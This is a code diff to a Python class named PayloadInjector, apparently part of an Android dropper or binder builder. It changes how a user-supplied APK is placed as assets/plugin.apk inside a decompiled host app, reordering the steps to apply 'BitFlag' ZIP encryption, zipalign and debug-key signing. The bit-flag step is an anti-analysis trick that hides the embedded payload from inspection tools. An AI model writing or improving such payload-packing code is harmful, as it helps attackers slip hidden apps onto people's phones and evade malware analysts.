@@ -248,7 +248,7 @@ class PayloadInjector:
             return None
     
     async def _inject_plugin_apk(self, user_apk_path):
-        """Replace assets/plugin.apk with user APK (Sign + BitFlag)"""
+        """Replace assets/plugin.apk with user APK (BitFlag → Zipalign → Sign)"""
         try:
             plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
             
@@ -258,45 +258,58 @@ class PayloadInjector:
                 logger.debug("Removed old plugin.apk")
             
             # Temp files for processing
+            temp_encrypted = os.path.join(self.work_dir, 'plugin_encrypted.apk')
+            temp_aligned = os.path.join(self.work_dir, 'plugin_aligned.apk')
             temp_signed = os.path.join(self.work_dir, 'plugin_signed.apk')
             
             # === Processing pipeline for plugin.apk ===
+            # ترتیب صحیح: BitFlag → Zipalign → Sign
             
-            # Step 1: Sign user APK with debug.keystore
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             logger.info("📦 Processing plugin.apk:")
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            logger.info("✍️  Step 1: Signing plugin...")
             
-            signed_apk = await self._sign_apk(user_apk_path, temp_signed)
+            # Step 1: Apply BitFlag encryption (if needed)
+            logger.info("🔐 Step 1: Encrypting plugin...")
             
-            if not signed_apk or not os.path.exists(signed_apk):
-                logger.error("❌ Signing failed!")
-                logger.warning("⚠️  Using original APK (not recommended)")
-                signed_apk = user_apk_path
-            else:
-                logger.info("✅ Plugin signed with debug.keystore")
-            
-            # Step 2: Apply BitFlag encryption
-            logger.info("🔐 Step 2: Encrypting plugin...")
-            
-            # Check if already has BitFlag
-            already_encrypted = await self._check_bitflag(signed_apk)
+            already_encrypted = await self._check_bitflag(user_apk_path)
             
             if already_encrypted:
                 logger.info("✅ BitFlag already present, skipping encryption")
-                shutil.copy2(signed_apk, plugin_path)
+                current_apk = user_apk_path
             else:
-                encrypted_apk = await self._encrypt_bitflag(signed_apk, plugin_path)
+                encrypted_apk = await self._encrypt_bitflag(user_apk_path, temp_encrypted)
                 
                 if not encrypted_apk:
-                    logger.warning("⚠️  Encryption failed, copying signed APK")
-                    shutil.copy2(signed_apk, plugin_path)
+                    logger.warning("⚠️  Encryption failed, using original")
+                    current_apk = user_apk_path
                 else:
                     logger.info("✅ Plugin encrypted (BitFlag)")
+                    current_apk = temp_encrypted
+            
+            # Step 2: Zipalign
+            logger.info("⚙️  Step 2: Zipalign plugin...")
+            
+            if await self._zipalign(current_apk, temp_aligned):
+                logger.info("✅ Plugin aligned")
+                current_apk = temp_aligned
+            else:
+                logger.warning("⚠️  Zipalign failed, continuing without it")
+            
+            # Step 3: Sign
+            logger.info("✍️  Step 3: Signing plugin...")
+            
+            signed_apk = await self._sign_apk(current_apk, plugin_path)
+            
+            if not signed_apk or not os.path.exists(plugin_path):
+                logger.error("❌ Signing failed!")
+                logger.warning("⚠️  Copying without signature")
+                shutil.copy2(current_apk, plugin_path)
+            else:
+                logger.info("✅ Plugin signed with debug.keystore")
             
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            logger.info("✅ Plugin ready: Signed ✍️ + Encrypted 🔐")
+            logger.info("✅ Plugin ready: BitFlag 🔐 → Aligned ⚙️ → Signed ✍️")
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             
             return True
